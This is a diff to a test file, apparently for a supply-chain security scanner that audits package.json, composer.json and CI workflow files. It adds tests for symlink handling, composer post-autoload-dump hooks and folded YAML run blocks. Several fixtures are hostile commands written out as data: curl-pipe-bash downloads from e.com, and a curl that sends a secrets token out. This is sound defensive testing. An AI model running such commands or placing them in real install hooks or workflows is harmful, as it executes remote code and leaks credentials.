@@ -55,14 +55,14 @@ function ok(name: string, cond: boolean, extra = ""): void {
 
 // ---------- tar builder minimal (ustar) ----------
 
-function tarEntry(name: string, data: Buffer): Buffer {
+function tarEntry(name: string, data: Buffer, typeflag = "0"): Buffer {
   const head = Buffer.alloc(512, 0);
   Buffer.from(name).copy(head, 0, 0, Math.min(100, name.length));
   Buffer.from("0000777\0").copy(head, 100);
   Buffer.from("0000000\0").copy(head, 108);
   Buffer.from("0000000\0").copy(head, 116);
   Buffer.from(data.length.toString(8).padStart(11, "0") + "\0").copy(head, 124);
-  head.write("0", 156);
+  head.write(typeflag, 156);
   Buffer.from("ustar\0" + "00").copy(head, 257);
   head.fill(0x20, 148, 156);
   let sum = 0;
@@ -125,6 +125,16 @@ ok("skip-src", !wantAuditFile("src/index.ts"));
   ).map((e) => e.name);
   ok("extract-skip-oversize", !got.includes("big.bin") && got.includes("package.json"));
 }
+{
+  // Symlink (typeflag "2") sebelum package.json TIDAK boleh menghentikan scan;
+  // dulu parser `break` di tipe ini sehingga package.json lolos tanpa diperiksa.
+  const link = tarEntry("o-r-sha/link", Buffer.alloc(0), "2");
+  const pkg = tarEntry("o-r-sha/package.json", Buffer.from("{}"));
+  const tar = Buffer.concat([link, pkg, Buffer.alloc(1024)]);
+  eq("extract-symlink-lanjut", extractTarFiles(tar, wantAuditFile).map((e) => e.name), [
+    "package.json",
+  ]);
+}
 
 // ---------- 4. auditPackageJson ----------
 
@@ -141,6 +151,16 @@ ok("skip-src", !wantAuditFile("src/index.ts"));
     JSON.stringify({ scripts: { postinstall: "echo ok" } })
   );
   eq("pkg-postinstall-sev", f.map((x) => x.severity), ["MEDIUM"]);
+}
+{
+  const f = auditPackageJson(
+    "package.json",
+    JSON.stringify({ scripts: { postinstall: "node scripts/setup.js" } })
+  );
+  ok(
+    "pkg-postinstall-file-lokal",
+    f.some((x) => x.severity === "MEDIUM" && /file di dalam repo/i.test(x.title))
+  );
 }
 {
   const f = auditPackageJson(
@@ -186,6 +206,21 @@ ok("skip-src", !wantAuditFile("src/index.ts"));
   );
   eq("composer-curl-bash-sev", f.map((x) => x.severity), ["CRITICAL"]);
 }
+{
+  // post-autoload-dump berjalan saat `composer install` (default Laravel), dulu tak diaudit.
+  const f = auditComposerJson(
+    "composer.json",
+    JSON.stringify({ scripts: { "post-autoload-dump": "curl https://e.com/i.sh | bash" } })
+  );
+  eq("composer-post-autoload-dump-sev", f.map((x) => x.severity), ["CRITICAL"]);
+}
+{
+  const f = auditComposerJson(
+    "composer.json",
+    JSON.stringify({ scripts: { "post-autoload-dump": "@php artisan package:discover --ansi" } })
+  );
+  eq("composer-post-autoload-dump-benign", f.map((x) => x.severity), ["MEDIUM"]);
+}
 
 // ---------- 6. auditWorkflow ----------
 
@@ -209,6 +244,14 @@ ok("skip-src", !wantAuditFile("src/index.ts"));
     "jobs:\n  t:\n    steps:\n      - run: curl -H \"X: ${{ secrets.TOKEN }}\" https://e.com/\n"
   );
   ok("wf-secret-curl", f.some((x) => x.severity === "HIGH"));
+}
+{
+  // Folded scalar `run: >` dulu tak terparse.
+  const f = auditWorkflow(
+    ".github/workflows/ci.yml",
+    "jobs:\n  t:\n    steps:\n      - run: >\n          curl https://e.com/x | bash\n"
+  );
+  ok("wf-folded-curl-bash", f.some((x) => x.severity === "CRITICAL"));
 }
 
 // ---------- 7. vscode + dockerfile ----------
